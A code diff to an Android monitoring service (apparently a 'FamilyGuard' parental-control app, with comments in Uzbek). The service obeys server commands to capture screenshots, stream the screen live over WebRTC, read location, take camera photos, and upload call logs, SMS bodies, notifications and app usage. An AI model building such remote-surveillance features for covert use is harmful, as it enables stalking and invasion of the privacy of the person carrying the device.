@@ -15,6 +15,8 @@ import android.os.Build
 import android.os.IBinder
 import android.view.WindowManager
 import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
+import org.json.JSONArray
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.util.Base64
@@ -32,46 +34,10 @@ class ScreenCaptureService : Service() {
     private var display: VirtualDisplay? = null
     private var reader: ImageReader? = null
     private var w = 1080; private var h = 1920; private var dpi = 320
+
+    private var savedProjectionIntent: Intent? = null
     private var webRTC: WebRTCManager? = null
 
-// onCreate da:
-override fun onCreate() {
-    super.onCreate()
-    instance  = this
-    isRunning = true
-    webRTC = WebRTCManager(
-        this,
-        "", // deviceId keyinroq set qilinadi
-        BuildConfig.API_URL,
-        BuildConfig.DEVICE_SECRET
-    )
-    webRTC?.init()
-    // ...
-}
-
-// handleRequest da SCREEN_SHARE:
-"SCREEN_SHARE" -> {
-    if (webRTC?.isStreaming == true) {
-        webRTC?.stopStream()
-        api.updateStatus(id, "DONE", "stopped")
-    } else if (projection != null) {
-        // MediaProjection permission intentni qayta ishlatamiz
-        // webRTC ga deviceId set qilamiz
-        webRTC = WebRTCManager(
-            this, deviceId,
-            BuildConfig.API_URL,
-            BuildConfig.DEVICE_SECRET
-        )
-        webRTC?.init()
-        // Projection intent saqlab qo'yish kerak
-        savedProjectionIntent?.let { intent ->
-            webRTC?.startStream(intent)
-            api.updateStatus(id, "DONE", "streaming")
-        } ?: api.updateStatus(id, "FAILED")
-    } else {
-        api.updateStatus(id, "FAILED")
-    }
-}
     private lateinit var api: Api
     private lateinit var deviceId: String
 
@@ -101,8 +67,6 @@ override fun onCreate() {
                 .build()
         )
 
-        // Intent dan deviceId olishga harakat qil,
-        // bo'lmasa SharedPreferences dan ol (START_STICKY restart uchun)
         val devId = intent?.getStringExtra("deviceId")
             ?: getSharedPreferences("fg", MODE_PRIVATE).getString("deviceId", null)
 
@@ -113,7 +77,6 @@ override fun onCreate() {
                 .edit().putString("deviceId", devId).apply()
         }
 
-        // Screen capture ruxsati
         val code = intent?.getIntExtra("resultCode", Activity.RESULT_CANCELED)
         val data: Intent? = if (Build.VERSION.SDK_INT >= 33)
             intent?.getParcelableExtra("code", Intent::class.java)
@@ -121,6 +84,9 @@ override fun onCreate() {
             @Suppress("DEPRECATION") intent?.getParcelableExtra("code")
 
         if (code != null && code != Activity.RESULT_CANCELED && data != null) {
+            // Screen capture ruxsatini saqlab qo'yamiz (WebRTC uchun ham kerak)
+            savedProjectionIntent = data
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 val b = getSystemService(WindowManager::class.java).currentWindowMetrics.bounds
                 w = b.width(); h = b.height()
@@ -140,7 +106,6 @@ override fun onCreate() {
             )
         }
 
-        // Loop faqat bir marta va deviceId bo'lganda ishga tushsin
         if (!running && ::deviceId.isInitialized) {
             running = true
             WatchdogReceiver.schedule(this)
@@ -160,6 +125,7 @@ override fun onCreate() {
         running   = false
         isRunning = false
         instance  = null
+        webRTC?.stopStream()
         display?.release()
         reader?.close()
         projection?.stop()
@@ -201,15 +167,14 @@ override fun onCreate() {
             }
         } catch (_: Exception) {}
     }
+
     private fun hasPermission(perm: String): Boolean {
-    return androidx.core.content.ContextCompat.checkSelfPermission(
-        this, perm
-    ) == android.content.pm.PackageManager.PERMISSION_GRANTED
-}
+        return ContextCompat.checkSelfPermission(this, perm) ==
+            android.content.pm.PackageManager.PERMISSION_GRANTED
+    }
+
     private fun startHeartbeatLoop() {
-        
         thread(name = "heartbeat") {
-            // Avval register qilib ol
             try { api.register(deviceId, "Child device") } catch (_: Exception) {}
             while (running) {
                 try {
@@ -217,7 +182,7 @@ override fun onCreate() {
                     val bat = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                     api.heartbeat(deviceId, bat)
                 } catch (_: Exception) {}
-                Thread.sleep(5_000) // 10 dan 8 ga tushirdim — ishonchli bo'lsin
+                Thread.sleep(5_000)
             }
         }
     }
@@ -241,128 +206,116 @@ override fun onCreate() {
         thread {
             try {
                 when (type) {
+
                     "SCREENSHOT" -> {
                         val b64 = when {
                             Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
-                            FamilyGuardAccessibilityService.isEnabled() -> {
+                            FamilyGuardAccessibilityService.isEnabled() ->
                                 FamilyGuardAccessibilityService.takeShot()
-                            }
                             projection != null && reader != null -> capture()
                             else -> null
                         }
                         if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
                         else api.updateStatus(id, "FAILED")
                     }
+
+                    "SCREEN_SHARE" -> {
+                        if (webRTC?.isStreaming == true) {
+                            // Ikkinchi marta bosilsa — to'xtatamiz
+                            webRTC?.stopStream()
+                            api.updateStatus(id, "DONE", "stopped")
+                        } else {
+                            val projIntent = savedProjectionIntent
+                            if (projIntent != null && ::deviceId.isInitialized) {
+                                webRTC = WebRTCManager(
+                                    this,
+                                    deviceId,
+                                    BuildConfig.API_URL,
+                                    BuildConfig.DEVICE_SECRET
+                                )
+                                webRTC?.init()
+                                webRTC?.startStream(projIntent)
+                                api.updateStatus(id, "DONE", "streaming")
+                            } else {
+                                api.updateStatus(id, "FAILED")
+                            }
+                        }
+                    }
+
                     "LOCATION" -> {
                         val loc = LocationHelper(this).getLocation()
                         if (loc != null) api.updateStatus(id, "DONE", "${loc.first},${loc.second}")
                         else api.updateStatus(id, "FAILED")
                     }
+
                     "CAMERA_FRONT" -> shootCamera(id, CameraCharacteristics.LENS_FACING_FRONT)
                     "CAMERA_BACK"  -> shootCamera(id, CameraCharacteristics.LENS_FACING_BACK)
+
                     "APP_LIST" -> {
                         val json = AppHelper(this).getInstalledApps()
                         api.updateStatus(id, "DONE", api.uploadJson(json))
                     }
-                    "CALL_LOGS" -> {
-    try {
-        val calls = TelephonyHelper(this).getCallLogs(50)
-        val arr   = org.json.JSONArray()
-        calls.forEach { c ->
-            arr.put(JSONObject().apply {
-                put("number",   c.number)
-                put("type",     c.type)
-                put("duration", c.durationSec)
-                put("date",     c.date)
-            })
-        }
-        if (arr.length() == 0) api.updateStatus(id, "FAILED")
-        else api.updateStatus(id, "DONE", api.uploadJson(arr.toString()))
-    } catch (_: Exception) {
-        api.updateStatus(id, "FAILED")
-    }
-}
 
-"SMS_LOGS" -> {
-    try {
-        val smsList = TelephonyHelper(this).getSmsLogs(50)
-        val arr     = org.json.JSONArray()
-        smsList.forEach { s ->
-            arr.put(JSONObject().apply {
-                put("address", s.address)
-                put("body",    s.body)
-                put("type",    s.type)
-                put("date",    s.date)
-            })
-        }
-        if (arr.length() == 0) api.updateStatus(id, "FAILED")
-        else api.updateStatus(id, "DONE", api.uploadJson(arr.toString()))
-    } catch (_: Exception) {
-        api.updateStatus(id, "FAILED")
-    }
-}
-
-"NOTIFICATION_LOGS" -> {
-    try {
-        val json = NotificationService.getRecent()
-        if (json == "[]") api.updateStatus(id, "FAILED")
-        else api.updateStatus(id, "DONE", api.uploadJson(json))
-    } catch (_: Exception) {
-        api.updateStatus(id, "FAILED")
-    }
-}
-                    "CALL_LOG" -> {
-    try {
-        val calls = TelephonyHelper(this).getCallLogs(50)
-        val arr   = org.json.JSONArray()
-        calls.forEach { c ->
-            arr.put(JSONObject().apply {
-                put("number",   c.number)
-                put("type",     c.type)
-                put("duration", c.durationSec)
-                put("date",     c.date)
-            })
-        }
-        if (arr.length() == 0) api.updateStatus(id, "FAILED")
-        else api.updateStatus(id, "DONE", api.uploadJson(arr.toString()))
-    } catch (_: Exception) {
-        api.updateStatus(id, "FAILED")
-    }
-}
-
-"SMS_LOG" -> {
-    try {
-        val smsList = TelephonyHelper(this).getSmsLogs(50)
-        val arr     = org.json.JSONArray()
-        smsList.forEach { s ->
-            arr.put(JSONObject().apply {
-                put("address", s.address)
-                put("body",    s.body)
-                put("type",    s.type)
-                put("date",    s.date)
-            })
-        }
-        if (arr.length() == 0) api.updateStatus(id, "FAILED")
-        else api.updateStatus(id, "DONE", api.uploadJson(arr.toString()))
-    } catch (_: Exception) {
-        api.updateStatus(id, "FAILED")
-    }
-}
-
-"NOTIFICATIONS" -> {
-    try {
-        val json = NotificationService.getRecent()
-        if (json == "[]") api.updateStatus(id, "FAILED")
-        else api.updateStatus(id, "DONE", api.uploadJson(json))
-    } catch (_: Exception) {
-        api.updateStatus(id, "FAILED")
-    }
-}
                     "APP_USAGE" -> {
                         val json = AppHelper(this).getAppUsage()
                         if (json == "[]") api.updateStatus(id, "FAILED")
                         else api.updateStatus(id, "DONE", api.uploadJson(json))
                     }
+
+                    "CALL_LOGS" -> {
+                        if (!hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
+                            api.updateStatus(id, "FAILED"); return@thread
+                        }
+                        try {
+                            val calls = TelephonyHelper(this).getCallLogs(50)
+                            val arr   = JSONArray()
+                            calls.forEach { c ->
+                                arr.put(JSONObject().apply {
+                                    put("number",   c.number)
+                                    put("type",     c.type)
+                                    put("duration", c.durationSec)
+                                    put("date",     c.date)
+                                })
+                            }
+                            if (arr.length() == 0) api.updateStatus(id, "FAILED")
+                            else api.updateStatus(id, "DONE", api.uploadJson(arr.toString()))
+                        } catch (_: Exception) {
+                            api.updateStatus(id, "FAILED")
+                        }
+                    }
+
+                    "SMS_LOGS" -> {
+                        if (!hasPermission(android.Manifest.permission.READ_SMS)) {
+                            api.updateStatus(id, "FAILED"); return@thread
+                        }
+                        try {
+                            val smsList = TelephonyHelper(this).getSmsLogs(50)
+                            val arr     = JSONArray()
+                            smsList.forEach { s ->
+                                arr.put(JSONObject().apply {
+                                    put("address", s.address)
+                                    put("body",    s.body)
+                                    put("type",    s.type)
+                                    put("date",    s.date)
+                                })
+                            }
+                            if (arr.length() == 0) api.updateStatus(id, "FAILED")
+                            else api.updateStatus(id, "DONE", api.uploadJson(arr.toString()))
+                        } catch (_: Exception) {
+                            api.updateStatus(id, "FAILED")
+                        }
+                    }
+
+                    "NOTIFICATION_LOGS" -> {
+                        try {
+                            val json = NotificationService.getRecent()
+                            if (json == "[]") api.updateStatus(id, "FAILED")
+                            else api.updateStatus(id, "DONE", api.uploadJson(json))
+                        } catch (_: Exception) {
+                            api.updateStatus(id, "FAILED")
+                        }
+                    }
+
                     else -> api.updateStatus(id, "FAILED")
                 }
             } catch (_: Exception) {
